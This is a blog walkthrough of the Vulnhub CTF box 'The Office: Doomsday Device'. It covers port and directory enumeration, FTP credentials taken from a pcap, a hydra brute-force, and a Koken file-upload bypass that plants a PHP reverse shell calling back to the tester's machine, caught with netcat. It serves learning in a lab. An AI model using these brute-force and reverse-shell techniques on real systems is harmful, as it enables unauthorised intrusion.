---
title: "Vulnhub - The Office: Doomsday Device"
date: "2022-01-06"
categories: 
  - "vulnhub"
tags: 
  - "vulnhub"
coverImage: "Screen-Shot-2022-03-03-at-3.27.44-PM.png"
---

## Introduction/Background

This box is a beginner level CTF with a couple sections that are a bit tricky. It’s a lot of fun, especially if you’re a fan of the show, and I definitely learned a couple things from it. You can find the download on it’s Vulnhub page here: [https://www.vulnhub.com/entry/the-office-doomsday-device,627/](https://www.vulnhub.com/entry/the-office-doomsday-device,627/). The goal is to find 8 flags hidden throughout the machine, get root, and stop the doomsday device from sending incriminating emails from the employees of Dunder Mifflin to their new boss Robert California.

## Initial Enumeration

I started off with an nmap scan with all ports and the -A flag:

~/Documents/vulnhub/doomsdayDevice » cat nmap/initial.nmap 
# Nmap 7.91 scan initiated Mon Jan  3 20:55:51 2022 as: nmap -A -p- -v -oA nmap/initial 10.0.2.7
Nmap scan report for 10.0.2.7
Host is up (0.00090s latency).
Not shown: 64957 closed ports, 573 filtered ports
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 3.0.3
22/tcp    open  tcpwrapped
|\_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|\_  Supported Methods: HEAD GET POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|\_/nothingtoseehere
|\_http-server-header: Apache/2.4.29 (Ubuntu)
|\_http-title: Site doesn't have a title (text/html).
18888/tcp open  http       Apache httpd 2.4.29 ((Ubuntu))
|\_http-generator: Koken 0.22.24
| http-methods: 
|\_  Supported Methods: GET HEAD POST OPTIONS
|\_http-server-header: Apache/2.4.29 (Ubuntu)
|\_http-title: Dunder Mifflin
65533/tcp open  http       Apache httpd 2.4.29
| http-methods: 
|\_  Supported Methods: HEAD GET POST OPTIONS
|\_http-server-header: Apache/2.4.29 (Ubuntu)
|\_http-title: 403 Forbidden
Service Info: Host: 127.0.1.1; OS: Unix

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  3 20:57:21 2022 -- 1 IP address (1 host up) scanned in 90.22 seconds

There’s 4 open ports, 3 http and 1 ftp, as well as one filtered port 22. We’ll start with port 80 for flag 1. Going to the page shows an under construction page, which isn’t very helpful to us:

![Under Construction](images/underConstruction-1024x762.png)

Checking the source shows us this comment way at the bottom:

<!-- Li0tLSAuLiAtLSAvIC4tIC0uIC0uLiAvIC4tLS4gLi0gLS0gLyAuLi4uIC4tIC4uLi0gLiAvIC0gLi0gLi0uLiAtLi0gLiAtLi4gLyAuLSAtLi4uIC0tLSAuLi0gLSAvIC0tIC4gLyAuLiAtLiAvIC0tIC0tLSAuLS4gLi4uIC4gLyAtLi0uIC0tLSAtLi4gLiAvIC4uLiAuIC4uLi0gLiAuLS4gLi0gLi0uLiAvIC0gLi4gLS0gLiAuLi4gLi0uLS4tIC8gLS4uLiAuLi0gLSAvIC4tLS0gLS0tIC0uLSAuIC4tLS0tLiAuLi4gLyAtLS0gLS4gLyAtIC4uLi4gLiAtLSAvIC0uLi4gLiAtLi0uIC4tIC4uLSAuLi4gLiAvIC4uIC8gLS4tIC0uIC0tLSAuLS0gLyAtLSAtLS0gLi0uIC4uLiAuIC8gLS4tLiAtLS0gLS4uIC4gLi0uLS4tIC8gLi4uIC4uIC0uIC0uLS4gLiAvIC0uLS0gLS0tIC4uLSAvIC0uLS4gLS0tIC4uLSAuLS4uIC0uLiAvIC4tLiAuIC4tIC0uLiAvIC0gLi4uLiAuLiAuLi4gLyAuLiAvIC4tIC4uLiAuLi4gLi4tIC0tIC4gLyAtLi0tIC0tLSAuLi0gLyAtLi0gLS4gLS0tIC4tLSAvIC4uIC0gLyAtIC0tLSAtLS0gLi0uLS4tIC8gLi0gLS4gLS4tLSAuLS0gLi0gLS4tLSAuLi4gLyAtIC4uLi4gLi4gLi4uIC8gLi4gLi4uIC8gLi0tLSAuLi0gLi4uIC0gLyAtIC4uLi4gLiAvIC4uLS4gLi4gLi0uIC4uLiAtIC8gLi4tLiAuLS4uIC4tIC0tLiAtLS4uLS0gLyAtLi0tIC0tLSAuLi0gLyAuLS0gLi4gLi0uLiAuLS4uIC8gLS4gLiAuLi4tIC4gLi0uIC8gLS4tLiAuLS4gLi0gLS4tLiAtLi0gLyAtLSAtLi0tIC8gLi4gLS4gLS0uIC4gLS4gLi4gLS0tIC4uLSAuLi4gLyAtLSAuLSAtLi0uIC4uLi4gLi4gLS4gLiAtLS4uLS0gLyAtLi4gLS0tIC0uIC4tLS0tLiAtIC8gLi4tLiAtLS0gLi0uIC0tLiAuIC0gLyAuLiAvIC4tIC0tIC8gLS4uLiAuIC0gLSAuIC4tLiAvIC0gLi4uLiAuLSAtLiAvIC0uLS0gLS0tIC4uLSAvIC4uLi4gLi0gLi4uLSAuIC8gLiAuLi4tIC4gLi0uIC8gLS4uLiAuIC4gLS4gLyAtLS0gLi0uIC8gLiAuLi4tIC4gLi0uIC8gLi0tIC4uIC4tLi4gLi0uLiAvIC0uLi4gLiAtLi0uLS0gLyAtLi4gLi0tIC4uIC0tLiAuLi4uIC0gLyAuLi0uIC4tLi4gLi0gLS0uIC4tLS0tIC0tLS4uLiAvIC0tLS4uIC0uLS4gLi0gLi4tLiAtLS0tLiAtLi0uIC0uLi4uIC4uLi4tIC4uLS4gLS0tLS4gLS4uIC4tLS0tIC4tLS0tIC0tLS4uIC4tLS0tIC4uLS0tIC0tLS0tIC0uLi4uIC4uLS4gLiAtLi0uIC0tLi4uIC4uLS4gLi4uLi0gLS0tLS0gLi0gLS0uLi4gLi4uLi4gLi4tLS0gLi4uLi0gLS4uLiAuLi4tLQ== -->

You can use [CyberChef](https://gchq.github.io/CyberChef/) to help decode this. Using the magic recipe will show that it’s base64 encoded morse code, and after decoding that we get a message from Dwight and the first flag:

![Cyberchef](images/cyberChef-1024x437.png)

JIM AND PAM HAVE TALKED ABOUT ME IN MORSE CODE SEVERAL TIMES. BUT JOKE'S ON THEM BECAUSE I KNOW MORSE CODE. SINCE YOU COULD READ THIS I ASSUME YOU KNOW IT TOO. ANYWAYS THIS IS JUST THE FIRST FLAG, YOU WILL NEVER CRACK MY INGENIOUS MACHINE, DON'T FORGET I AM BETTER THAN YOU HAVE EVER BEEN OR EVER WILL BE! DWIGHT

### FLAG1:8CAF9C64F9D1181206FEC7F40A7524B3

The second flag I actually found way later, but with this walkthrough I wanted to put them in order. This flag was found on the port 65533 site. The home page gives a 403 error, so I tried to do some directory bruteforcing on it:

~ » gobuster dir -u http://10.0.2.7:65533 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o 65533dir.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
\[+\] Url:                     http://10.0.2.7:65533
\[+\] Method:                  GET
\[+\] Threads:                 10
\[+\] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
\[+\] Negative Status codes:   404
\[+\] User Agent:              gobuster/3.1.0
\[+\] Timeout:                 10s
===============================================================
2022/01/06 10:31:17 Starting gobuster in directory enumeration mode
===============================================================
/secret               (Status: 301) \[Size: 314\] \[--> http://10.0.2.7:65533/secret/\]
/server-status        (Status: 403) \[Size: 276\]                                    

===============================================================
2022/01/06 10:32:00 Finished
===============================================================

This shows a secret directory which we can access. Pulling it up in a web browser gives us the second flag and a Schrute Buck, which is arguably more valuable:

![](images/image-2-1024x448.png)

### FLAG2: 0a9025f72493da059a26db3acb0e2c42

The next step for the port 80 page was some directory brute forcing.

~/Documents/vulnhub/doomsdayDevice » dirb http://10.0.2.7 -o 80dirb.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT\_FILE: 80dirb.txt
START\_TIME: Mon Jan  3 21:03:46 2022
URL\_BASE: http://10.0.2.7/
WORDLIST\_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.2.7/ ----
+ http://10.0.2.7/index.html (CODE:200|SIZE:2819)                                                                     
+ http://10.0.2.7/robots.txt (CODE:200|SIZE:42)                                                                       
+ http://10.0.2.7/server-status (CODE:403|SIZE:273)                                                                   

-----------------
END\_TIME: Mon Jan  3 21:03:48 2022
DOWNLOADED: 4612 - FOUND: 3
-----------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » curl http://10.0.2.7/robots.txt
User-agent: \*
Disallow: /nothingtoseehere
-----------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » curl http://10.0.2.7/nothingtoseehere
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.0.2.7 Port 80</address>
</body></html>

The robots.txt file shows a directory called nothingtoseehere. It isn’t present at the root, so for now we’ll keep it in mind and keep going. I also ran gobuster with a different list, and got some more results:

~/Documents/vulnhub/doomsdayDevice » gobuster dir -u http://10.0.2.7 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt    
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
\[+\] Url:                     http://10.0.2.7
\[+\] Method:                  GET
\[+\] Threads:                 10
\[+\] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
\[+\] Negative Status codes:   404
\[+\] User Agent:              gobuster/3.1.0
\[+\] Timeout:                 10s
===============================================================
2022/01/04 15:25:15 Starting gobuster in directory enumeration mode
===============================================================
/nick                 (Status: 301) \[Size: 303\] \[--> http://10.0.2.7/nick/\]
/staffblog            (Status: 301) \[Size: 308\] \[--> http://10.0.2.7/staffblog/\]
/server-status        (Status: 403) \[Size: 273\]                                 
Progress: 127318 / 220561 (57.72%)                                             \[ERROR\] 2022/01/04 15:25:52 \[!\] Get "http://10.0.2.7/40289": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
\[ERROR\] 2022/01/04 15:25:52 \[!\] Get "http://10.0.2.7/61606": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
\[ERROR\] 2022/01/04 15:25:52 \[!\] Get "http://10.0.2.7/b-torque": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
\[ERROR\] 2022/01/04 15:25:52 \[!\] Get "http://10.0.2.7/48573": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
\[ERROR\] 2022/01/04 15:25:52 \[!\] Get "http://10.0.2.7/0012Z9-wc": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
\[ERROR\] 2022/01/04 15:25:52 \[!\] Get "http://10.0.2.7/100936": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
\[ERROR\] 2022/01/04 15:25:52 \[!\] Get "http://10.0.2.7/84264": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
\[ERROR\] 2022/01/04 15:25:52 \[!\] Get "http://10.0.2.7/127217": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
\[ERROR\] 2022/01/04 15:25:52 \[!\] Get "http://10.0.2.7/en10618248-wc": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
\[ERROR\] 2022/01/04 15:25:52 \[!\] Get "http://10.0.2.7/48505": context deadline exceeded (Client.Timeout exceeded while awaiting headers)

===============================================================
2022/01/04 15:26:12 Finished
===============================================================

This shows two new directories in nick and staffblog. Checking nick first, there were 2 files, a text file and a pcap:

~/Documents/vulnhub/doomsdayDevice » curl http://10.0.2.7/nick/farewell.txt
Hey Michael!

I just wanted to say goodbye. Through Teach for America, I'm gonna go down to Detroit and teach inner-city kids about computers. You know, I'm the lame IT guy and probably you don't even know my name so, who cares. But I just wanted you to know that the old creepy guy uses a pretty weak password. You know, the one who smells like death. You should do something about it. 

Nick
--------------------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » wget http://10.0.2.7/nick/nick.pcap
--2022-01-04 15:32:54-- http://10.0.2.7/nick/nick.pcap
Connecting to 10.0.2.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7750 (7.6K) \[application/vnd.tcpdump.pcap\]
Saving to: ‘nick.pcap’

nick.pcap                       100%\[=======================================================>\]   7.57K  --.-KB/s    in 0s      

2022-01-04 15:32:54 (920 MB/s) - ‘nick.pcap’ saved \[7750/7750\]
-----------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » tcpick -yP -r nick.pcap
Starting tcpick 0.2.1 at 2022-01-04 15:31 EST
Timeout for connections is 600
tcpick: reading from nick.pcap
1      SYN-SENT       10.0.2.15:49224 > 10.0.2.75:ftp
1      SYN-RECEIVED   10.0.2.15:49224 > 10.0.2.75:ftp
1      ESTABLISHED    10.0.2.15:49224 > 10.0.2.75:ftp
220 (vsFTPd 3.0.3)
USER creed
331 Please specify the password.
PASS creed
230 Login successful.
SYST
215 UNIX Type: L8
PORT 10,0,2,15,235,21
200 PORT command successful. Consider using PASV.
LIST -al
2      SYN-SENT       10.0.2.75:ftp-data > 10.0.2.15:60181
2      SYN-RECEIVED   10.0.2.75:ftp-data > 10.0.2.15:60181
2      ESTABLISHED    10.0.2.75:ftp-data > 10.0.2.15:60181
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Oct 19 07:56 .
drwxr-xr-x    2 1002     1002         4096 Oct 19 07:56 ..
-rw-r--r-- 1 1002     1002          220 Apr 04  2018 .bash\_logout
-rw-r--r-- 1 1002     1002         3771 Apr 04  2018 .bashrc
-rw-r--r-- 1 1002     1002          807 Apr 04  2018 .profile
-rw-rw-r-- 1 1002     1002           26 Oct 19 07:56 new\_identity
2      FIN-WAIT-1     10.0.2.75:ftp-data > 10.0.2.15:60181
2      TIME-WAIT      10.0.2.75:ftp-data > 10.0.2.15:60181
2      CLOSED         10.0.2.75:ftp-data > 10.0.2.15:60181
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 10,0,2,15,215,155
200 PORT command successful. Consider using PASV.
RETR new\_identity
3      SYN-SENT       10.0.2.75:ftp-data > 10.0.2.15:55195
3      SYN-RECEIVED   10.0.2.75:ftp-data > 10.0.2.15:55195
3      ESTABLISHED    10.0.2.75:ftp-data > 10.0.2.15:55195
150 Opening BINARY mode data connection for new\_identity (26 bytes).
William Charles Schneider
3      FIN-WAIT-1     10.0.2.75:ftp-data > 10.0.2.15:55195
3      TIME-WAIT      10.0.2.75:ftp-data > 10.0.2.15:55195
3      CLOSED         10.0.2.75:ftp-data > 10.0.2.15:55195
226 Transfer complete.
TYPE A
200 Switching to ASCII mode.
PORT 10,0,2,15,190,211
200 PORT command successful. Consider using PASV.
LIST -al
4      SYN-SENT       10.0.2.75:ftp-data > 10.0.2.15:48851
4      SYN-RECEIVED   10.0.2.75:ftp-data > 10.0.2.15:48851
4      ESTABLISHED    10.0.2.75:ftp-data > 10.0.2.15:48851
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Oct 19 07:56 .
drwxr-xr-x    2 1002     1002         4096 Oct 19 07:56 ..
-rw-r--r-- 1 1002     1002          220 Apr 04  2018 .bash\_logout
-rw-r--r-- 1 1002     1002         3771 Apr 04  2018 .bashrc
-rw-r--r-- 1 1002     1002          807 Apr 04  2018 .profile
-rw-rw-r-- 1 1002     1002           26 Oct 19 07:56 new\_identity
4      FIN-WAIT-1     10.0.2.75:ftp-data > 10.0.2.15:48851
4      TIME-WAIT      10.0.2.75:ftp-data > 10.0.2.15:48851
4      CLOSED         10.0.2.75:ftp-data > 10.0.2.15:48851
226 Directory send OK.
QUIT
221 Goodbye.
1      FIN-WAIT-1     10.0.2.15:49224 > 10.0.2.75:ftp
1      TIME-WAIT      10.0.2.15:49224 > 10.0.2.75:ftp
1      CLOSED         10.0.2.15:49224 > 10.0.2.75:ftp
tcpick: done reading from nick.pcap

75 packets captured
4 tcp sessions detected

The text file is Nick’s, the IT guy from the office, message about leaving to go to go to Teach for America, but with an added bit at the end about the old guy (Creed) having a bad password. The pcap reinforces that, as it shows Creed’s FTP credentials are creed:creed. I wrote that down and went on to the staffblog directory. This had one doc file, which I downloaded to investigate:

~/Documents/vulnhub/doomsdayDevice » antiword CreedThoughts.doc > creedThoughts.txt
--------------------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » cat creedThoughts.txt                                                                  1 ↵

www.creedthoughts.gov.www/creedthoughts

Creed Thoughts!

Hey-o, everyone out there in SyberWorld. It,s old Creed Bratton coming at
your again, here from my perch as a Quality Assurance Manager at Dunder
Mifflin paper. Just a few observations on the world around me.

What do you guys think is the best kind of car? To me, you can,t beat
motorcycles. They're small and dangerous.

I got into a car accident yesterday and I just took off. It didn't look too
bad. The guy was making a big deal out of it, but come on — dogs dont live
forever.

Sometimes when I,m sick, or feeling blue, I drink vinegar. I like all
kinds: balsamic, vodka, orange juice, leaves.

Working in an office is fine, but I,d rather be a millionaire. (Elaborate
on this. It,s interesting. Maybe Trademark it, too.)

Today in my office where I work as Director of Quality Assurance, we went
to the beach for some reason that was never adequately explained. When we
were there, our manager told us to eat hot coals. I thought that was a
little bit untoward so I ate a fish. Then a woman I have literally never
seen before in my entire life started talking very loudly about something
involving Halpert. She was agitated, I,d say. From what I could guess, she
was definitely on drugs of some kind, perhaps cocaine, or maybe ‘drines.
Also, she is a knock-out. She reminds me of a young Daphne Du Maurier.
Also, I stupidly ate the fishbones. I told myself “never again”? after the
last time, but then you turn around, and bam, they're in my mouth. I also
ate 55 hot dogs in 15 minutes, which is a world record.

Everybody remembers: “April showers bring May flowers.” But no one
remembers how the rest of that goes. Which I find so frustrating.

Prediction: the Orioles will win the World Series over the Pirates in seven
games.

Prediction: the space program will be renamed the Outer Space Program by
2060.

Prediction: someday we will be able to travel faster than sound. We will
“break the sound barrier.”

Prediction: \[note - need more predictions.\]

Reminder: The IT guy told that my password is not safe enough. I wonder how
he found out. Anyways, I added 3 digits to the end so it’s supersafe now.
Nobody's gonna crack that, baby!

#FLAG3: 50f1ff7bc72bb24c0082be83a8b8c497

Antiword converts doc file’s to txt files, which are easier to read. After checking it out, we see flag 3 and some more info on Creed’s password. He added 3 letters to the end to make it more secure. Knowing that, we should be able to crack it later.

### FLAG3: 50f1ff7bc72bb24c0082be83a8b8c497

The last port to check for now was 18888. The webpage looks like a blog that has pictures of from the halloween party they had:

![](images/image-3-1024x730.png)

Clicking around, the only interesting thing was a note from angela that showed an email. The address was angela@dundermifflin.com, which shows their email format that may come in handy later. I also did some directory brute forcing. I had to exclude results with a length of 0 because without that every directory checked was printed to the screen:

~/Documents/vulnhub/doomsdayDevice » gobuster dir -u http://10.0.2.7:18888 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o 18888Dir.txt --exclude-length 0
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
\[+\] Url:                     http://10.0.2.7:18888
\[+\] Method:                  GET
\[+\] Threads:                 10
\[+\] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
\[+\] Negative Status codes:   404
\[+\] Exclude Length:          0
\[+\] User Agent:              gobuster/3.1.0
\[+\] Timeout:                 10s
===============================================================
2022/01/04 16:08:42 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) \[Size: 313\] \[--> http://10.0.2.7:18888/admin/\]
/storage              (Status: 301) \[Size: 315\] \[--> http://10.0.2.7:18888/storage/\]
/app                  (Status: 301) \[Size: 311\] \[--> http://10.0.2.7:18888/app/\]    
/server-status        (Status: 403) \[Size: 276\]                                     

===============================================================
2022/01/04 16:15:34 Finished
===============================================================

The admin page is interesting, but we don’t have the login credentials yet. The login page looks to be from an app called Koken, which makes sense as the original nmap command showed a field `_http-generator: Koken 0.22.24`. Looking for default credentials, I didn’t find any but I did find a possible tool for later. Koken 0.22.24 has an [authenticated RCE through file upload](https://www.exploit-db.com/exploits/48706) that we may be able to exploit. Since we don’t have default creds or ones we’ve found, we’ll have to save this for later.

## Brute forcing the FTP password and getting FTP access

We know Creed’s ftp password is creed followed by 3 numbers. Since this is only 1000 possible choices, we can generate a list of all of the possible values and throw that at hydra to see which one is the correct one. A quick way to generate a list of numbers in bash is using [brace expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html), which you can see in the first command. The basic idea is that if you put two values in braces that have a clear path between them, i.e. two numbers or two characters, bash will expand and fill in the values and the path between them. For example, `{0...5}` will become `0 1 2 3 4 5`. The other nice bit is it will keep other characters outside the braces: `a{0...3}b` goes to `a0b a1b a2b a3b` . I used the brace expansion to add every three digit number after creed and, after changing spaces to new lines, save that to a list.

~/Documents/vulnhub/doomsdayDevice » echo creed{000..999} | tr ' ' '\\n' > creedPass.lst
-----------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » hydra -l creed -P creedPass.lst ftp://10.0.2.7
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-04 14:49:18
\[DATA\] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task
\[DATA\] attacking ftp://10.0.2.7:21/
\[21\]\[ftp\] host: 10.0.2.7   login: creed   password: creed223
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-04 14:50:09
-----------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » ftp 10.0.2.7
Connected to 10.0.2.7.
220 (vsFTPd 3.0.3)
Name (10.0.2.7:connor): creed
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r-- 1 0        0            2026 Nov 12  2020 archive.zip
-rw-r--r-- 1 0        0             176 Nov 30  2020 reminder.txt
226 Directory send OK.
ftp> download reminder.txt
?Invalid command
ftp> get reminder.txt
local: reminder.txt remote: reminder.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for reminder.txt (176 bytes).
226 Transfer complete.
176 bytes received in 0.00 secs (38.5197 kB/s)
ftp> get archive.zip
local: archive.zip remote: archive.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for archive.zip (2026 bytes).
226 Transfer complete.
2026 bytes received in 0.00 secs (1.1549 MB/s)
ftp> exit
221 Goodbye.
--------------------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » cat reminder.txt 
Oh snap, I forgot the password for this zip file. I remember, it made Michael laugh when he heard it, but Pam got really offended.

#FLAG4: 4955cbee5a6a5a48ce79624932bd1374

As you can see, hydra found the correct password to be creed223. Using that to log in, we found two files in Creed’s FTP, reminder.txt and archive.zip. I downloaded both and checked reminder.txt, which gave us a hint to the password of the zip file and the fourth flag.

### FLAG4: 4955cbee5a6a5a48ce79624932bd1374

That hint turns out to be pretty helpful. [In the show,](https://www.youtube.com/watch?v=8GxqvnQyaxs) at one point they are locked out of the wifi and can’t get in. They have to remember the password, which “made Michael laugh when he heard it, but Pam got really offended”. The password ended up being bigboobz, “with a z”. We can use that same password to unzip the zip file we found:

~/Documents/vulnhub/doomsdayDevice » unzip archive.zip 
Archive:  archive.zip
\[archive.zip\] email password: 
  inflating: email                   
  inflating: michael                 
--------------------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » cat email 
To: oscar@dundermifflin.com
Subject: Costume Party
From: michael@dundermifflin.com
Content-Type: text/html; charset="utf8"

Hey Oscar!

Angela is out sick so she couldn't manage the costume party gallery right now. Dwight showed up as a jamaican zombie woman AGAIN. It's gross. Please remove the picture from the gallery. Oh yeah, you don't have access to it, so just use Angela's profile. The password is most probably one of her cats name. 

Michael%                                                                                                                        --------------------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » cat michael 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,CF1CA7F9558B5637B0C9F66B972B6AB6

GlAt2Uhi+zBOMhGrASR0ica1YTk7BTBNzKAkqLGzyTy1eplEKiTou7LdW5hV7Khf
ZU+9X9Cg5L9KHT+w0OFQeVghzYOwZ+aeyzoii1Wo/pFx460eUj5oFTJnsN/UvHfi
sjGX8bLp4RT+HjTZr7b2+XiDww33xdskdnXeHBc9CsDRA+59x8+bszto+X3zaIVF
LaJ4nIx2nTVtn9DKEItfmsL3iCn4BKKT1kQ94K8R3Cx11Hdb49buByRYcICJhoT6
j416LKNUnH9F53dLyHrY6VoxjrckZWQC05DhiNgva6TxBqoX8XMEVWNf9UBoqsbl
MYVY5p2nbvM6u6pyViX6hSqLLxMe9kcyvYeC51irASXIlGZW6fQEieGesRm4uKG4
HeFtT57TXh7XIjqscqsR/swFMF9FGRRro0fCDTza3q+lKrmGWSQT6zM4F4iH0oOu
6K8cpe2JBfBQTHIXG136Xu4IF/4FVzXFfP4B920ecwTjRdxpeCZIKcItqp6dQ50f
HomaBFr0Bka/UfyJADDaDJ1oC78Vgg31y6QQwQsfKpiL0GDYwmCYFEk2/WBF8uyf
ZwTh0CnyUcIyXxv996ZLfX9RSRcrKXhMjw2YLz43cP5bkwUrBZ1/OnnCsxzaZWBX
r+NZEWkFIfFGat6RWmregVwR58oQg4s07fIIN+VFWTdCl9HGFlMGBrpUrly5PIzF
5hEIxDiuL6LEcW5kMYwtrPCo4QK+++KikySBpNaVxuY0Fy1E07AKyFl+7DMu82eH
hI29O4ebO0J15jxIX8Ta9dXCspqKbYeL6RMB6/uZEd61cP2Mh0Kd8K7rUuCdyOIF
7RXF61whnhy4YB7Um+O3iTABQjsR2T0+IKxasYEriuQNMrqMwtQXPIfxJ/wAcViA
mLKh/HoCUCfoC8+ksWwycYuEde06OxRH9zn0HITt5pgs+gtkBgGG25xSUbE9rGMC
iQGd/wDIcad0tjT9WnxoSPvlYRHSWLy5KjyGGShWRcXbMM4lhZbvHHktr6pD35rn
XMWdsLTKn5xr0IDF+iBNpd/cUKGO1Wi4TjZkZf6aTZZCzumrf3/A1ZH6pf32vRdg
9fA4eEHgwwn/qLJRYo33mj96+gBdRleYBaIxUmxm4VbJ8qkD0kthPI32LzvVgKOM
8q2J1cC7pJN5BVM1nmMPxz29MUZXvf4RU75p9fE1lBaX/5aBp+J7HUHREBg0cod6
6NHJ+u/WgGhrUGITi2V+4SL7Xi5F1ig2goA8EL5MYlnv4tU39Bihw6AOfqmGza9H
cQr9vsF1ryFXqAD7IxwjjTYgcTWxEj2P/LBzeC6rfLzgPeulPkPHVBaiB2lzIGEB
uExO3CjF9cqZMRyRo8XhOmrZw5vE2eO43uqpWFIwb4PUoG3uVcKEVqpuZ6bSYPvI
L59nw0ONv+1G4t4BG/WSHGKBq1hcpOpNIFGASFR8eVVchpK9OtMTwGvSp/M7diRR
/EjSLFhcBhKgjInCHgyRnQa5X3B6z9/HIGkwdH381CuXl5MYxDAt3S3IvJ6prolz
0lpnN5PD4wHHDdvVSntdV5w4rdJSdWaVcHohLLj/elYvPkjor8MARqeLatyYUL2y
-----END RSA PRIVATE KEY-----

The zip has two files, an email from Michael to Oscar about removing pictures from the blog, and a RSA private key for Michael. Since the SSH port is filtered, we will focus on the blog now.

## Brute forcing the Halloween blog password

From the email we found in the zip file, we know angela’s password is the name of one of her cats. From [this wiki page](https://theoffice.fandom.com/wiki/Angela%27s_cats), Angela has 17 cats. Because this was not a big number, I just did it manually. That email we found did end up coming in handy, because Koken needs an email address to log in. The correct password ended up being one of the last ones, Crinklepuss.

## File upload to RCE

As mentioned earlier, there’s a vulnerability in Koken 0.22.24 that allows us to get command execution once we are signed in and have the ability to upload a file. We couldn’t do that before, but we can now. The exploitDB post is [here](https://www.exploit-db.com/exploits/48706), but the vulnerability is pretty easy to exploit. You take a PHP file, append .JPG to the name of the file, intercept the upload with Burp, and remove the .JPG from the name of the file. Koken thinks that you are uploading a JPG, but once it’s on the server it will be treated as a PHP file. We can use a reverse shell as the PHP file to get the ability to run commands. Kali already has reverse shells saved, so I copied one to the current directory and changed the necessary lines

~/Documents/vulnhub/doomsdayDevice » cp /usr/share/webshells/php/php-reverse-shell.php revshell.php.jpg
--------------------------------------------------------------------------------------------------------------------------------
~/Documents/vulnhub/doomsdayDevice » vim revshell.php.jpg
... trimmed ...
$ip = '10.0.2.15';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
... trimmed ...

The only step left was to upload and intercept the upload. On the website, I hit import content > click to browse, and selected the “image”, after switching my proxy to Burp. After hitting upload, the name needs to be changed as such:

![](images/image-4-1024x571.png)

After updating that line and forwarding the request, the file is good to go. All that is required now was to set up a listener on the correct port for the reverse shell, and then running the file by going to the last import tab and clicking the file:

~/Documents/vulnhub/doomsdayDevice » nc -lvp 4444
listening on \[any\] 4444 ...
10.0.2.7: inverse host lookup failed: Unknown host
connect to \[10.0.2.15\] from (UNKNOWN) \[10.0.2.7\] 59632
Linux doomsday 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86\_64 x86\_64 x86\_64 GNU/Linux
 21:50:10 up  2:18,  0 users,  load average: 0.00, 0.00, 0.41
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
